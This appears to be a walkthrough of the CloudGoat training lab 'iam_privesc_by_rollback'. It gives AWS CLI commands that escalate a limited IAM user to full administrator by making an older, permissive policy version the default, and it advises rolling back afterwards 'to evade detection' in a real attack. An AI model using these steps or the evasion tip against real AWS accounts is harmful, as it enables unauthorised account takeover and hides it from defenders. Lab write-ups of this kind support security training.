# IAM prvilege Escalation
The goal of this scenario is to use a access limited user to escalate their privileges to full admin privileges.

## Installation
```./cloudgoat.py create iam_privesc_by_rollback```

## Scenario Walkthrough
### Assume Role Raynor
Add raynor into the AWS CLI profiles and login as the user
```
aws configure --profile raynor
<Add access key, secret access key, region and text as output>
aws sts get-caller-identity 
.. arn:aws:iam::<account number>:user/<username> ...
```

### Identify permissions tied with Raynor
1. List permissions
```
aws iam list-attached-user-policies --user-name <username> --profile raynor
```
We see that 1 policy is associated with the user. Note that using list-user-policies will not see previous versions of the policy.
2. Enumerate policy versions
```
aws iam list-policy-versions --policy-arn <policy arn> --profile raynor
Search for True as the current version.
```
We can see that there are 5 versions of the policy.
3. List the most current version
```
aws iam get-policy-version --policy-arn <policy arn> --profile raynor --version-id v1 --output json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:Get*",
                        "iam:List*",
                        "iam:SetDefaultPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "IAMPrivilegeEscalationByRollback"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2023-04-20T03:37:16+00:00"
    }
}
```
We see that we can set a default version policy. Hence we will search for a version that allows administrative privileges.

### Privilege Escalate
1. Identify versions that have administrative privileges
```
aws iam get-policy-version --policy-arn <policy arn> --profile raynor --version-id v2 --output json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": "*",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": false,
        "CreateDate": "2023-04-20T03:37:19+00:00"
    }
}
```
Thus, we can use the above version for the default policy
2. Set default policy
```
aws iam set-default-policy-version --policy-arn <policy arn> --profile raynor --version-id v2
```
3. In an actual scenario, once you have executed your actions you can revert back to the original policy to evade detection
```
aws iam set-default-policy-version --policy-arn <policy arn> --profile raynor --version-id v1
```
## References
You can refer to the challenge here: https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/iam_privesc_by_rollback/README.md